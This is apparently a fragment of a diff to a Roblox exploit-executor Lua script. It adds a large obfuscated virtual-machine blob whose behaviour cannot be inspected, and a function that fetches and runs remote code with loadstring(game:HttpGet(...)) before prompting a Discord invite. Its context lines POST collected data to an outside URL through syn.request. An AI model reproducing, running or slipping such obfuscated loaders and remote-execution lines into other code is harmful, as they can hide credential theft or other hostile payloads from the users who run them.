o[e]=p[e+n];end;end;local e=y-r+n local e;local r;while true do e=a[l];r=e[(-0x11+18)];d=(8991730)while(0x15a8/132)>=r do d-= d d=(2320925)while(86+(-0x11+-49))>=r do d-= d d=(842972)while((1299+-0x6f)/132)>=r do d-= d d=(7461118)while r<=(0x2f+-43)do d-= d d=(3504978)while r<=(0x5b/91)do d-= d d=(3022100)while(57+(-0x36c6/246))<r do d-= d local d=e[O];local l=o[e[M]];o[d+1]=l;o[d]=l[e[S]];break end while(d)/((-0x3a+2630))==1175 do o[e[O]]=o[e[t]]-o[e[s]];break end;break;end while(d)/(((572474/0x67)-0xaec))==1269 do d=(8746840)while r<=(0x130/152)do d-= d u[e[c]]=o[e[U]];break;end while(d)/((265384/0x62))==3230 do d=(562026)while(30/(0x59-79))<r do d-= d local r;local d;o[e[O]]=u[e[D]];l=l+n;e=a[l];o[e[w]]=u[e[c]];l=l+n;e=a[l];o[e[b]]=e[c];l=l+n;e=a[l];o[e[b]]=e[M];l=l+n;e=a[l];o[e[_]]=e[D];l=l+n;e=a[l];d=e[_]o[d]=o[d](P(o,d+n,e[t]))l=l+n;e=a[l];o[e[_]]=o[e[M]][o[e[C]]];l=l+n;e=a[l];d=e[b]o[d]=o[d](o[d+x])l=l+n;e=a[l];r=o[e[s]];if not r then l=l+x;else o[e[w]]=r;l=e[k];end;break end while 1993==(d)/((0x7eae/115))do o[e[b]]=#o[e[M]];break end;break;end break;end break;end while 2038==(d)/((0x50712/(-86+0xb0)))do d=(2838684)while r<=(0x1e-24)do d-= d d=(1000404)while r>(-0x1d+34)do d-= d local e=e[O]o[e](o[e+x])break end while 531==(d)/((0x79c+-64))do local e={o,e};e[x][e[i][O]]=e[n][e[i][B]]+e[x][e[i][c]];break end;break;end while(d)/((0x3c467/239))==2748 do d=(573620)while r<=(0x46+-63)do d-= d if not o[e[f]]then l=l+x;else l=e[k];end;break;end while 1334==(d)/((-24+0x1c6))do d=(10054008)while(584/0x49)<r do d-= d o[e[w]]=o[e[D]];break end while 2488==(d)/((0x6f7b9/113))do if(o[e[O]]==o[e[s]])then l=l+x;else l=e[M];end;break end;break;end break;end break;end break;end while(d)/((-52+0x263))==1508 do d=(9394224)while(-0x63+113)>=r do d-= d d=(6770976)while(49+(88+-0x7e))>=r do d-= d d=(1056720)while(135+-0x7d)<r do d-= d o[e[w]]=(e[t]~=0);break end while 555==(d)/((213248/0x70))do o[e[_]]=(e[t]~=0);l=l+x;break end;break;end while 4016==(d)/((0xd7a-(0xe0c-1832)))do d=(4653296)while((0xff-191)-52)>=r do d-= d o[e[b]]=j[e[k]];break;end while 2696==(d)/((-99+0x721))do d=(6424728)while r>((299-0xc8)-0x56)do d-= d o[e[b]]=o[e[k]]-o[e[B]];break end while(d)/((0x12dc-2459))==2712 do o[e[b]]=o[e[h]][e[C]];break end;break;end break;end break;end while 2298==(d)/((8230-0x102e))do d=(1266444)while r<=(-51+(200-0x84))do d-= d d=(419900)while(0x8d9/(9664/0x40))>=r do d-= d local d=e[D];local l=o[d]for e=d+1,e[B]do l=l..o[e];end;o[e[w]]=l;break;end while 650==(d)/((82042/0x7f))do d=(117990)while r>(96/0x6)do d-= d j[e[M]]=o[e[b]];break end while 570==(d)/((0x21b-332))do local d;local r;o[e[b]]=u[e[h]];l=l+n;e=a[l];o[e[U]]=e[D];l=l+n;e=a[l];o[e[f]]=e[c];l=l+n;e=a[l];r=e[c];d=o[r]for e=r+1,e[N]do d=d..o[e];end;o[e[U]]=d;l=l+n;e=a[l];if o[e[_]]then l=l+n;else l=e[D];end;break end;break;end break;end while(d)/((-31+0x90d))==554 do d=(7802626)while r<=(-55+0x49)do d-= d local d=e[f];local l=o[e[c]];o[d+1]=l;o[d]=l[e[v]];break;end while 2159==(d)/((0x1c69-3659))do d=(7124048)while(1197/0x3f)<r do d-= d local r;local d;o[e[b]]=(e[D]~=0);l=l+n;e=a[l];o[e[b]]=o[e[M]];l=l+n;e=a[l];o[e[w]]=u[e[k]];l=l+n;e=a[l];d=e[U]o[d]=o[d](o[d+x])l=l+n;e=a[l];r=o[e[B]];if not r then l=l+x;else o[e[O]]=r;l=e[D];end;break end while(d)/((45528/(0x6e+-89)))==3286 do if o[e[b]]then l=l+n;else l=e[k];end;break end;break;end break;end break;end break;end break;end while 1075==(d)/((4334-(0x7f71/15)))do d=(1768272)while r<=(185-0x9a)do d-= d d=(5155381)while(0x81-104)>=r do d-= d d=(3315375)while(2420/0x6e)>=r do d-= d d=(448341)while r>(-0x12+39)do d-= d local e={o,e};e[x][e[i][U]]=e[n][e[i][C]]+e[x][e[i][h]];break end while 1003==(d)/((-100+0x223))do u[e[h]]=o[e[w]];l=l+n;e=a[l];o[e[b]]={};l=l+n;e=a[l];o[e[b]]={};l=l+n;e=a[l];u[e[k]]=o[e[O]];l=l+n;e=a[l];o[e[f]]=u[e[h]];l=l+n;e=a[l];if(o[e[O]]~=e[v])then l=l+x;else l=e[c];end;break end;break;end while 1263==(d)/((2683+-0x3a))do d=(3510210)while((0x48-97)+48)>=r do d-= d do return end;break;end while(d)/((0xa4508/232))==1210 do d=(2380350)while(66-0x2a)<r do d-= d if(o[e[f]]~=e[S])then l=l+x;else l=e[k];end;break end while 2267==(d)/((99750/0x5f))do o[e[b]]=o[e[M]][o[e[s]]];break end;break;end break;end break;end while(d)/((0xd2f-(0x601dc/226)))==3157 do d=(2774380)while r<=(89-0x3d)do d-= d d=(1837620)while(58+-0x20)>=r do d-= d o[e[w]]=#o[e[c]];break;end while 1107==(d)/((0x634ac/245))do d=(4542084)while(0x7d-98)<r do d-= d o[e[f]]=o[e[k]][e[S]];break end while(d)/((-50+0x736))==2529 do local r=L[e[h]];local n;local d={};n=G({},{__index=function(l,e)local e=d[e];return e[1][e[2]];end,__newindex=function(o,e,l)local e=d[e]e[1][e[2]]=l;end;});for n=1,e[S]do l=l+x;local e=a[l];if e[(0x6a+-105)]==9 then d[n-1]={o,e[h]};else d[n-1]={j,e[M]};end;g[#g+1]=d;end;o[e[b]]=m(r,n,u);break end;break;end break;end while(d)/((0xc01+-93))==931 do d=(1694187)while((8016-0xfcb)/0x89)>=r do d-= d o[e[f]]=m(L[e[t]],nil,u);break;end while 981==(d)/((3563-0x72c))do d=(5294196)while(84+-0x36)<r do d-= d l=e[c];break end while(d)/((66864/0x1c))==2217 do o[e[O]][e[t]]=o[e[s]];break end;break;end break;end break;end break;end while 816==(d)/((359722/0xa6))do d=(10821411)while(0xfc0/112)>=r do d-= d d=(8816670)while(6633/0xc9)>=r do d-= d d=(2381190)while r>(0x8f-111)do d-= d j[e[t]]=o[e[w]];break end while(d)/((0x7f044/130))==595 do o[e[w]][e[c]]=e[N];break end;break;end while 2445==(d)/((483204/0x86))do d=(11159462)while r<=(92+-0x3a)do d-= d o[e[U]][e[h]]=e[S];break;end while 2806==(d)/((8030-0xfd5))do d=(808800)while(0x85+-98)<r do d-= d o[e[O]]=o[e[h]]%e[S];break end while(d)/(((0x108f3d5/229)/0x2d))==480 do o[e[f]]=e[h];break end;break;end break;end break;end while(d)/((5951-0xbc0))==3677 do d=(10197590)while(-57+0x60)>=r do d-= d d=(2425920)while(0x6c+-71)>=r do d-= d local j;local r;local C;local d;o[e[w]]=u[e[D]];l=l+n;e=a[l];o[e[_]]=o[e[c]][e[v]];l=l+n;e=a[l];d=e[f];C=o[e[k]];o[d+1]=C;o[d]=C[e[N]];l=l+n;e=a[l];o[e[b]]=o[e[h]];l=l+n;e=a[l];o[e[w]]=o[e[D]];l=l+n;e=a[l];d=e[_]o[d]=o[d](P(o,d+n,e[h]))l=l+n;e=a[l];d=e[f];C=o[e[M]];o[d+1]=C;o[d]=C[e[v]];l=l+n;e=a[l];d=e[w]o[d]=o[d](o[d+x])l=l+n;e=a[l];r={o,e};r[x][r[i][b]]=r[n][r[i][s]]+r[x][r[i][c]];l=l+n;e=a[l];o[e[f]]=o[e[k]]%e[N];l=l+n;e=a[l];d=e[w]o[d]=o[d](o[d+x])l=l+n;e=a[l];C=e[M];j=o[C]for e=C+1,e[S]do j=j..o[e];end;o[e[U]]=j;l=l+n;e=a[l];r={o,e};r[x][r[i][O]]=r[n][r[i][B]]+r[x][r[i][t]];l=l+n;e=a[l];o[e[U]]=o[e[c]]%e[B];break;end while 2660==(d)/(((3888-0x7aa)-1014))do d=(529372)while r>((0xaa+-27)+-0x69)do d-= d local d;o[e[_]]=u[e[D]];l=l+n;e=a[l];o[e[w]]=u[e[M]];l=l+n;e=a[l];o[e[b]]=e[c];l=l+n;e=a[l];o[e[b]]=e[k];l=l+n;e=a[l];o[e[O]]=e[c];l=l+n;e=a[l];d=e[O]o[d]=o[d](P(o,d+n,e[h]))l=l+n;e=a[l];o[e[_]]=o[e[t]][o[e[v]]];l=l+n;e=a[l];d=e[_]o[d]=o[d](o[d+x])l=l+n;e=a[l];o[e[f]]=o[e[c]];l=l+n;e=a[l];l=e[c];break end while 1487==(d)/(((84078-0xa456)/118))do o[e[f]]=o[e[c]];break end;break;end break;end while 3338==(d)/((0xbef0/16))do d=(12270141)while(0x19f0/166)>=r do d-= d do return o[e[_]]end break;end while(d)/((0x5259f/93))==3383 do d=(5422320)while(-39+0x50)<r do d-= d local r;local d;o[e[w]]=u[e[h]];l=l+n;e=a[l];o[e[U]]=u[e[k]];l=l+n;e=a[l];o[e[_]]=e[k];l=l+n;e=a[l];o[e[f]]=e[c];l=l+n;e=a[l];o[e[f]]=e[D];l=l+n;e=a[l];d=e[w]o[d]=o[d](P(o,d+n,e[D]))l=l+n;e=a[l];o[e[w]]=o[e[D]][o[e[s]]];l=l+n;e=a[l];d=e[O]o[d]=o[d](o[d+x])l=l+n;e=a[l];r=o[e[N]];if not r then l=l+x;else o[e[f]]=r;l=e[h];end;break end while 3060==(d)/((-18+0x6fe))do o[e[w]][e[k]]=o[e[C]];break end;break;end break;end break;end break;end break;end break;end while 2365==(d)/((0x1e21-3911))do d=(347028)while r<=(-119+0xb6)do d-= d d=(1506732)while((-107+0xb4)+-0x15)>=r do d-= d d=(3476940)while(0x4c6/26)>=r do d-= d d=(1076790)while r<=((0x12c-162)-0x5e)do d-= d d=(12190640)while(258/0x6)<r do d-= d if o[e[_]]then l=l+n;else l=e[k];end;break end while(d)/((47496/0xc))==3080 do local r;local d;o[e[O]]=u[e[h]];l=l+n;e=a[l];o[e[f]]=u[e[c]];l=l+n;e=a[l];o[e[_]]=e[c];l=l+n;e=a[l];o[e[f]]=e[k];l=l+n;e=a[l];o[e[U]]=e[k];l=l+n;e=a[l];d=e[w]o[d]=o[d](P(o,d+n,e[k]))l=l+n;e=a[l];o[e[_]]=o[e[D]][o[e[C]]];l=l+n;e=a[l];d=e[O]o[d]=o[d](o[d+x])l=l+n;e=a[l];r=o[e[N]];if not r then l=l+x;else o[e[b]]=r;l=e[t];end;break end;break;end while 1430==(d)/((0x816c/44))do d=(2958867)while(6435/0x8f)>=r do d-= d local e=e[f]o[e](o[e+x])break;end while(d)/((946679/0xef))==747 do d=(2470743)while r>(110+-0x40)do d-= d local e=e[U]o[e]=o[e](o[e+x])break end while(d)/((-0x47+(0x3c2/1)))==2773 do o[e[f]]=m(L[e[t]],nil,u);break end;break;end break;end break;end while 3470==(d)/((-65+0x42b))do d=(257706)while(0x9a-105)>=r do d-= d d=(15693475)while r>(11184/0xe9)do d-= d o[e[f]]=u[e[t]];break end while(d)/((670628/0xac))==4025 do local d=o[e[S]];if not d then l=l+x;else o[e[_]]=d;l=e[t];end;break end;break;end while(d)/((2602+-0x64))==103 do d=(3563136)while r<=(7050/0x8d)do d-= d local d;o[e[f]][o[e[k]]]=o[e[B]];l=l+n;e=a[l];d=e[O]o[d]=o[d](P(o,d+n,e[t]))l=l+n;e=a[l];o[e[f]][e[c]]=o[e[S]];l=l+n;e=a[l];d=e[O]o[d](o[d+x])l=l+n;e=a[l];do return end;break;end while(d)/((1809+-0x51))==2062 do d=(689316)while(-41+0x5c)<r do d-= d do return o[e[w]]end break end while(d)/((-126+(108398/0xa6)))==1308 do local e={o,e};e[n][e[i][O]]=e[i][B]+e[i][M];break end;break;end break;end break;end break;end while(d)/(((-0x3b-2)+0x861))==723 do d=(2131254)while r<=(-31+0x58)do d-= d d=(1842750)while(-0x5c+(-54+0xc8))>=r do d-= d d=(1111292)while(192-0x8b)<r do d-= d o[e[U]]={};break end while(d)/((0x1d39-3789))==301 do local e={o,e};e[n][e[i][_]]=e[i][S]+e[i][h];break end;break;end while 4095==(d)/((0x1dd+-27))do d=(2560986)while(-49+0x68)>=r do d-= d do return end;break;end while 657==(d)/((448270/0x73))do d=(14237147)while r>(0xc6-142)do d-= d if not o[e[U]]then l=l+x;else l=e[h];end;break end while 3697==(d)/((7809-0xf76))do if(o[e[w]]~=o[e[C]])then l=l+x;else l=e[h];end;break end;break;end break;end break;end while 1503==(d)/((146054/0x67))do d=(4632485)while r<=(140-0x50)do d-= d d=(6118638)while(142-0x54)>=r do d-= d local c=L[e[t]];local r;local d={};r=G({},{__index=function(l,e)local e=d[e];return e[1][e[2]];end,__newindex=function(o,e,l)local e=d[e]e[1][e[2]]=l;end;});for n=1,e[C]do l=l+x;local e=a[l];if e[(251/0xfb)]==9 then d[n-1]={o,e[t]};else d[n-1]={j,e[k]};end;g[#g+1]=d;end;o[e[b]]=m(c,r,u);break;end while 3763==(d)/((0x6b6+-92))do d=(443149)while r>(4012/0x44)do d-= d if(o[e[O]]~=o[e[N]])then l=l+x;else l=e[t];end;break end while 1073==(d)/((0x152ca/210))do local r;local d;d=e[w];r=o[e[D]];o[d+1]=r;o[d]=r[e[N]];l=l+n;e=a[l];o[e[_]]=e[k];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[c]))l=l+n;e=a[l];o[e[U]]=o[e[h]][e[v]];l=l+n;e=a[l];o[e[_]]=o[e[c]][e[C]];l=l+n;e=a[l];o[e[f]]=u[e[c]];l=l+n;e=a[l];o[e[w]]=e[k];l=l+n;e=a[l];o[e[b]]=e[k];l=l+n;e=a[l];o[e[U]]=e[D];l=l+n;e=a[l];d=e[w]o[d]=o[d](P(o,d+n,e[M]))l=l+n;e=a[l];o[e[O]]=u[e[k]];l=l+n;e=a[l];o[e[U]]=o[e[k]][e[N]];l=l+n;e=a[l];o[e[U]]={};l=l+n;e=a[l];o[e[b]]=u[e[c]];l=l+n;e=a[l];o[e[f]]=e[t];l=l+n;e=a[l];o[e[b]]=e[M];l=l+n;e=a[l];o[e[U]]=e[c];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[D]))l=l+n;e=a[l];o[e[U]][e[k]]=o[e[B]];l=l+n;e=a[l];o[e[w]][e[M]]=e[N];l=l+n;e=a[l];d=e[w]o[d]=o[d](o[d+x])l=l+n;e=a[l];o[e[U]]=u[e[c]];l=l+n;e=a[l];d=e[_];r=o[e[t]];o[d+1]=r;o[d]=r[e[s]];l=l+n;e=a[l];o[e[b]]=e[c];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[c]))l=l+n;e=a[l];d=e[O];r=o[e[k]];o[d+1]=r;o[d]=r[e[C]];l=l+n;e=a[l];o[e[O]]=o[e[c]][e[B]];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[c]))l=l+n;e=a[l];o[e[f]]=u[e[k]];l=l+n;e=a[l];o[e[U]]=o[e[D]][e[N]];l=l+n;e=a[l];o[e[b]]=u[e[c]];l=l+n;e=a[l];o[e[_]]=e[t];l=l+n;e=a[l];o[e[O]]=e[D];l=l+n;e=a[l];o[e[_]]=e[t];l=l+n;e=a[l];d=e[U]o[d]=o[d](P(o,d+n,e[M]))l=l+n;e=a[l];o[e[O]]=o[e[t]];l=l+n;e=a[l];o[e[_]]=o[e[D]][e[C]];l=l+n;e=a[l];o[e[U]]=o[e[h]][e[s]];l=l+n;e=a[l];o[e[_]]=o[e[h]][e[N]];l=l+n;e=a[l];o[e[w]]=o[e[k]][e[N]];l=l+n;e=a[l];o[e[_]]=o[e[h]][e[s]];l=l+n;e=a[l];o[e[b]]=o[e[t]][e[B]];l=l+n;e=a[l];o[e[_]]=o[e[t]][e[B]];l=l+n;e=a[l];o[e[U]]=o[e[M]][e[C]];l=l+n;e=a[l];o[e[b]]=o[e[t]][e[C]];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[c]))l=l+n;e=a[l];o[e[_]]=u[e[D]];l=l+n;e=a[l];o[e[b]]=o[e[t]][e[v]];l=l+n;e=a[l];o[e[w]]={};l=l+n;e=a[l];o[e[f]][e[h]]=o[e[S]];l=l+n;e=a[l];o[e[b]]=u[e[D]];l=l+n;e=a[l];o[e[O]]=e[h];l=l+n;e=a[l];o[e[b]]=e[M];l=l+n;e=a[l];o[e[O]]=e[M];l=l+n;e=a[l];d=e[w]o[d]=o[d](P(o,d+n,e[D]))l=l+n;e=a[l];o[e[_]][e[t]]=o[e[v]];l=l+n;e=a[l];o[e[_]]={};l=l+n;e=a[l];o[e[O]]=u[e[t]];l=l+n;e=a[l];o[e[w]]=e[k];l=l+n;e=a[l];o[e[O]]=e[h];l=l+n;e=a[l];o[e[f]]=e[c];l=l+n;e=a[l];d=e[f]o[d]=o[d](P(o,d+n,e[M]))l=l+n;e=a[l];o[e[w]]=u[e[h]];l=l+n;e=a[l];o[e[U]]=e[h];l=l+n;e=a[l];o[e[b]]=e[h];l=l+n;e=a[l];o[e[U]]=e[t];l=l+n;e=a[l];d=e[w]o[d]=o[d](P(o,d+n,e[k]))l=l+n;e=a[l];o[e[U]][o[e[M]]]=o[e[N]];l=l+n;e=a[l];o[e[_]][e[h]]=o[e[S]];l=l+n;e=a[l];o[e[O]]=u[e[M]];l=l+n;e=a[l];d=e[w];r=o[e[h]];o[d+1]=r;o[d]=r[e[N]];l=l+n;e=a[l];o[e[_]]=e[t];l=l+n;e=a[l];d=e[_]o[d]=o[d](P(o,d+n,e[h]))l=l+n;e=a[l];d=e[O];r=o[e[t]];o[d+1]=r;o[d]=r[e[s]];l=l+n;e=a[l];o[e[w]]={};l=l+n;e=a[l];o[e[b]]=u[e[c]];l=l+n;e=a[l];o[e[O]]=e[D];l=l+n;e=a[l];o[e[O]]=e[D];l=l+n;e=a[l];o[e[U]]=e[h];l=l+n;e=a[l];d=e[b]o[d]=o[d](P(o,d+n,e[M]))break end;break;end break;end while(d)/((206305/0x79))==2717 do d=(2549192)while(0x7e+-65)>=r do d-= d o[e[f]]=e[t];break;end while(d)/(((-0x46+15)+0x8ab))==1178 do d=(4473105)while(7626/0x7b)<r do d-= d o[e[U]][o[e[c]]]=o[e[B]];break end while 3277==(d)/(((-0x6d+207589)/0x98))do o[e[O]]=(e[c]~=0);break end;break;end break;end break;end break;end break;end while 132==(d)/(((875268/0xa4)-0xa94))do d=(15725675)while r<=(0xa0+-86)do d-= d d=(2970380)while r<=(199-(367-0xec))do d-= d d=(5015340)while r<=((0x2779-5100)/0x4d)do d-= d d=(591786)while r>(0x6b+-43)do d-= d local d=o[e[C]];if not d then l=l+x;else o[e[f]]=d;l=e[M];end;break end while(d)/((1726-0x373))==702 do o[e[f]]=(e[h]~=0);l=l+x;break end;break;end while(d)/(((0x1e09-3901)+-0x30))==1341 do d=(11360188)while r<=(133+-0x43)do d-= d o[e[U]][o[e[t]]]=o[e[S]];break;end while(d)/((693380/(27565/0x95)))==3031 do d=(120589)while r>(236-0xa9)do d-= d l=e[h];break end while(d)/((0x2dfa/110))==1127 do u[e[k]]=o[e[f]];break end;break;end break;end break;end while 1732==(d)/((-58+0x6ed))do d=(7893029)while r<=(266-0xc3)do d-= d d=(13156451)while(201-0x84)>=r do d-= d local x;local r;local d;o[e[f]]=e[M];l=l+n;e=a[l];o[e[U]]=e[h];l=l+n;e=a[l];o[e[U]]=#o[e[k]];l=l+n;e=a[l];o[e[w]]=e[D];l=l+n;e=a[l];d=e[f];r=o[d]x=o[d+2];if(x>0)then if(r>o[d+1])then l=e[k];else o[d+3]=r;end elseif(r<o[d+1])then l=e[k];else o[d+3]=r;end break;end while 3773==(d)/((7059-0xdf4))do d=(606000)while(0x2cd8/164)<r do d-= d local d=e[_];local a=o[d+2];local n=o[d]+a;o[d]=n;if(a>0)then if(n<=o[d+1])then l=e[h];o[d+3]=n;end elseif(n>=o[d+1])then l=e[h];o[d+3]=n;end break end while(d)/((0x13eb-2574))==240 do o[e[U]]={};break end;break;end break;end while 3739==(d)/((0x10a3-2148))do d=(13819750)while r<=(-66+0x8a)do d-= d local l=e[O]o[l]=o[l](P(o,l+n,e[M]))break;end while(d)/((-73+0xec7))==3725 do d=(1965138)while r>(0xda-145)do d-= d local d=e[_];local n=o[d]local a=o[d+2];if(a>0)then if(n>o[d+1])then l=e[M];else o[d+3]=n;end elseif(n<o[d+1])then l=e[c];else o[d+3]=n;end break end while(d)/((0x1f48-4054))==497 do local l=e[w]o[l]=o[l](P(o,l+n,e[k]))break end;break;end break;end break;end break;end while(d)/((-101+0x101e))==3907 do d=(228600)while(-0x7e+205)>=r do d-= d d=(168291)while r<=(0xf0-164)do d-= d d=(5623852)while(236-(0x179-216))<r do d-= d if(o[e[U]]~=e[N])then l=l+x;else l=e[t];end;break end while 2054==(d)/((0x20160/48))do local e=e[O]o[e]=o[e](o[e+x])break end;break;end while 271==(d)/((-74+0x2b7))do d=(350574)while(176+-0x63)>=r do d-= d local d=e[w];local n=o[d]local a=o[d+2];if(a>0)then if(n>o[d+1])then l=e[h];else o[d+3]=n;end elseif(n<o[d+1])then l=e[k];else o[d+3]=n;end break;end while 357==(d)/((1985-0x3eb))do d=(3780546)while(0x1026/53)<r do d-= d o[e[w]]=j[e[M]];l=l+n;e=a[l];o[e[w]]=#o[e[c]];l=l+n;e=a[l];j[e[t]]=o[e[U]];l=l+n;e=a[l];o[e[w]]=j[e[h]];l=l+n;e=a[l];o[e[b]]=#o[e[h]];l=l+n;e=a[l];j[e[c]]=o[e[U]];l=l+n;e=a[l];do return end;break end while(d)/((0x448+-67))==3674 do local d=e[t];local l=o[d]for e=d+1,e[C]do l=l..o[e];end;o[e[b]]=l;break end;break;end break;end break;end while(d)/(((5216400/0xe)/0xcf))==127 do d=(7824618)while(233-0x97)>=r do d-= d d=(1064218)while r<=(221-0x8d)do d-= d if(o[e[w]]==o[e[v]])then l=l+x;else l=e[h];end;break;end while 818==(d)/((-33+0x536))do d=(11498608)while r>((0x5735a/21)/210)do d-= d o[e[U]]=o[e[M]][o[e[v]]];break end while(d)/((0x26304/45))==3308 do o[e[O]]=u[e[c]];break end;break;end break;end while(d)/((5013-0x9f3))==3173 do d=(4891824)while r<=(0xda-135)do d-= d local d=e[U];local a=o[d+2];local n=o[d]+a;o[d]=n;if(a>0)then if(n<=o[d+1])then l=e[h];o[d+3]=n;end elseif(n>=o[d+1])then l=e[t];o[d+3]=n;end break;end while(d)/((0x4ec54/167))==2532 do d=(45253)while(13608/0xa2)<r do d-= d o[e[w]]=o[e[t]]%e[S];break end while(d)/((0x9e-99))==767 do o[e[O]]=j[e[c]];break end;break;end break;end break;end break;end break;end break;end l+= x end;end);end;return m(A(),{},W())()end)_msec({[(307-0xb4)]='\115\116'..(function(e)return(e and'㒠㒡㒚㒢㒥㒦㒣㒠㒤㒝㒙㒜㒘㒣㒤')or'\114\105'or'\120\58'end)((0x10e/54)==(133-0x7f))..'\110g',["㒚㒟㒠㒥㒞㒘㒣㒤㒜㒡㒠"]='\108\100'..(function(e)return(e and'㒞㒠㒙㒤㒣㒘㒢㒛㒦㒠㒥㒚㒚')or'\101\120'or'\119\111'end)(((1191-0x26d)/114)==(87-0x51))..'\112',["㒚㒦㒝㒤㒟㒞㒢㒛㒦㒛㒢㒞㒙㒥㒗㒟"]=(function(e)return(e and'㒞㒥㒠㒜㒦㒢㒟㒝')and'\98\121'or'\100\120'end)((0x52-(0xde-145))==(0x38-51))..'\116\101',["㒢㒛㒞㒟㒣㒙㒗㒘㒢㒟㒡"]='\99'..(function(e)return(e and'㒡㒢㒙㒡㒙㒗㒤㒜㒝㒛㒠㒥')and'\90\19\157'or'\104\97'end)((320/0x40)==(97-0x5e))..'\114',[(0x256+-44)]='\116\97'..(function(e)return(e and'㒢㒙㒞㒗㒤㒚㒠㒙㒞㒗㒘')and'\64\113'or'\98\108'end)((0x4b0/200)==(0x6d-104))..'\101',["㒣㒞㒥㒞㒠㒝㒥㒥㒜㒥㒜㒥㒡㒜㒦㒛㒥"]=(function(e)return(e and'㒤㒚㒠㒥㒡㒙㒣㒜㒟')or'\115\117'or'\78\107'end)((0x7a-119)==(124/0x4))..'\98',["㒘㒥㒜㒘㒗㒤㒥㒤㒗㒣㒙㒗㒚㒦"]='\99\111'..(function(e)return(e and'㒠㒣㒜㒞㒝㒚㒗㒗㒞㒜')and'\110\99'or'\110\105\103\97'end)((0xea7/121)==(0x1ee1/255))..'\97\116',[(-115+0x309)]=(function(e,l)return(e and'㒞㒢㒢㒛㒜㒛㒝㒛㒞㒚㒥㒣㒛㒘')and'\48\159\158\188\10'or'\109\97'end)((60/0xc)==(32-0x1a))..'\116\104',[(0xb12-1436)]=(function(l,e)return((-126+0x83)==(0x7f-124)and'\48'..'\195'or l..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["㒢㒠㒜㒝㒤㒚㒣㒥㒘㒤㒚"]='\105\110'..(function(e,l)return(e and'㒥㒞㒞㒜㒛㒤㒠㒢㒡㒣㒤㒢㒟㒝')and'\90\115\138\115\15'or'\115\101'end)((0x7e+-121)==(0x38+-25))..'\114\116',["㒦㒢㒜㒜㒙㒠㒚㒣㒛㒤㒝㒠㒛㒥㒣㒝"]='\117\110'..(function(e,l)return(e and'㒜㒞㒛㒤㒛㒙㒦㒚㒟㒙')or'\112\97'or'\20\38\154'end)((1240/0xf8)==(3875/(28125/0xe1)))..'\99\107',["㒙㒚㒙㒘㒞㒜㒦㒣㒞"]='\115\101'..(function(e)return(e and'㒚㒝㒗㒞㒜㒟㒜㒚')and'\110\112\99\104'or'\108\101'end)(((-37+0x69)+-0x3f)==(116-0x55))..'\99\116',["㒞㒞㒟㒞㒣㒙㒤㒞㒥㒘㒙"]='\116\111\110'..(function(e,l)return(e and'㒗㒝㒦㒙㒚㒜㒗㒙㒘㒞㒝㒞㒢㒠㒢㒘㒟')and'\117\109\98'or'\100\97\120\122'end)((30/0x6)==(125-0x78))..'\101\114'},{["㒛㒚㒙㒥㒗㒢㒤㒟㒡㒞㒙㒤㒙㒜"]=((getfenv))},((getfenv))()) end)()
+end
+
+
+
 
 
 
@@ -237,3 +389,17 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+
+
+
+
+
+
+---------------------- Discord invite from my discord server ----------------------
+function Sunrise()
+	local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
+
+	Module.Prompt({ invite = "https://discord.gg/xxdstbR4", name = "" }) -- name is optional
+	
+	Module.Join("")
+end
